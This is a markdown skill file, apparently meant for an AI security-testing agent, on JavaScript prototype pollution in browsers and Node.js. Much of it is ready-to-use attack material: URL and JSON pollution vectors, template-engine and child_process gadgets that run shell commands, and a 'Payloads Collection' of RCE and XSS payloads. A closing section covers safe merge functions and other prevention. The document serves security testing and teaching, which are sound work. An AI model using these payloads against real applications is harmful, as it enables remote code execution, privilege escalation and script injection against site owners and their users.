---
name: prototype-pollution
description: JavaScript prototype pollution for XSS and RCE in Node.js. Use for JavaScript security testing.
---

# Prototype Pollution

## Description
Prototype Pollution is a JavaScript vulnerability where an attacker can modify the prototype of base objects like `Object.prototype`. Since almost all JavaScript objects inherit from `Object.prototype`, this can affect the entire application, leading to XSS, RCE, or denial of service.

## How It Works

```javascript
// Normal JavaScript object inheritance
const obj = {};
console.log(obj.toString); // Function from Object.prototype

// Polluting the prototype
Object.prototype.polluted = "yes";
const newObj = {};
console.log(newObj.polluted); // "yes" - all objects affected!
```

## Pollution Vectors

### Via __proto__
```javascript
// Direct property assignment
obj.__proto__.polluted = "value";

// Via JSON
const malicious = JSON.parse('{"__proto__": {"polluted": "value"}}');
merge({}, malicious);
```

### Via constructor.prototype
```javascript
obj.constructor.prototype.polluted = "value";
// Or via JSON
{"constructor": {"prototype": {"polluted": "value"}}}
```

## Client-Side Prototype Pollution (CSPP)

### URL-Based Pollution
```
https://target.com/?__proto__[polluted]=value
https://target.com/?constructor[prototype][polluted]=value
https://target.com/#__proto__[polluted]=value

# Encoded variations
https://target.com/?__proto__%5Bpolluted%5D=value
```

### Form/Input Pollution
```html
<input name="__proto__[polluted]" value="payload">
```

### JSON-Based Pollution
```javascript
// If user input is merged into objects
{
    "__proto__": {
        "innerHTML": "<img src=x onerror=alert(1)>"
    }
}
```

## Server-Side Prototype Pollution (SSPP)

### Node.js Object Merge
```javascript
// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Exploitation
const payload = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, payload);

// Now all objects have admin: true
const user = {};
console.log(user.admin); // true
```

### Express.js Body Parsing
```json
POST /api/update HTTP/1.1
Content-Type: application/json

{
    "__proto__": {
        "admin": true
    }
}
```

## Exploitation Techniques

### Gadgets for RCE (Node.js)

#### child_process.spawn
```javascript
// If shell option is polluted
{"__proto__": {"shell": true}}

// Then spawn("command") uses shell
```

#### child_process.fork
```javascript
// Pollute NODE_OPTIONS
{"__proto__": {"NODE_OPTIONS": "--require /tmp/malicious.js"}}
```

#### EJS Template Engine
```javascript
// Pollute outputFunctionName
{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
    }
}
```

#### Pug Template Engine
```javascript
{
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync('id')"
        }
    }
}
```

### Gadgets for XSS (Client-Side)

#### jQuery
```javascript
// Pollute html attribute
{"__proto__": {"html": "<img src=x onerror=alert(1)>"}}
```

#### innerHTML Pollution
```javascript
// If code checks: if (obj.innerHTML) element.innerHTML = obj.innerHTML
{"__proto__": {"innerHTML": "<script>alert(1)</script>"}}
```

#### Event Handler Pollution
```javascript
{"__proto__": {"onclick": "alert(1)"}}
```

## Detection

### Manual Testing
```javascript
// In browser console
Object.prototype.testPollution = "polluted";
const test = {};
console.log(test.testPollution); // Should print "polluted"

// Clean up
delete Object.prototype.testPollution;
```

### URL Parameter Testing
```
?__proto__[test]=polluted
?constructor.prototype.test=polluted
```

### JSON Body Testing
```json
{"__proto__": {"test": "polluted"}}
{"constructor": {"prototype": {"test": "polluted"}}}
```

## Tools

### PPScan
```bash
# https://github.com/nickmakesstuff/PPScan
# Scan for prototype pollution gadgets

node ppscan.js --url "https://target.com"
```

### ppfinder
```bash
# https://github.com/nickmakesstuff/nickmakesstuff.github.io
# Find prototype pollution gadgets in JavaScript

ppfinder analyze app.js
```

### Burp Extensions
```
- Server-Side Prototype Pollution Scanner
- Prototype Pollution Scanner
```

### Browser DevTools
```javascript
// Check for pollution
Object.getOwnPropertyNames(Object.prototype)
// Look for unexpected properties
```

## Vulnerable Patterns

### Recursive Merge
```javascript
// VULNERABLE
function merge(a, b) {
    for (let key in b) {
        if (typeof b[key] === 'object') {
            a[key] = merge(a[key] || {}, b[key]);
        } else {
            a[key] = b[key];
        }
    }
    return a;
}
```

### Object.assign (Safe)
```javascript
// Object.assign is NOT vulnerable to __proto__
Object.assign({}, {"__proto__": {"polluted": true}});
// Does NOT pollute prototype
```

### JSON.parse Followed by Merge
```javascript
// VULNERABLE pattern
const userInput = '{"__proto__": {"admin": true}}';
const parsed = JSON.parse(userInput);
merge(config, parsed);  // Pollutes if merge is recursive
```

## Payloads Collection

### Basic Pollution
```
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
```

### URL Parameters
```
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor[prototype][polluted]=true
```

### RCE Payloads (Node.js)
```json
{"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /tmp/payload.js"}}
{"__proto__": {"execPath": "/bin/sh", "execArgv": ["-c", "id"]}}
```

### XSS Payloads
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
```

## Prevention

### Safe Merge Function
```javascript
function safeMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // Skip dangerous keys
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = safeMerge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### Object.create(null)
```javascript
// Create object without prototype
const safeObj = Object.create(null);
// safeObj has no __proto__
```

### Object.freeze
```javascript
// Prevent modification of prototype
Object.freeze(Object.prototype);
```

### Map Instead of Object
```javascript
// Use Map for user-controlled keys
const userConfig = new Map();
userConfig.set('key', 'value');
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
- https://portswigger.net/web-security/prototype-pollution
- https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
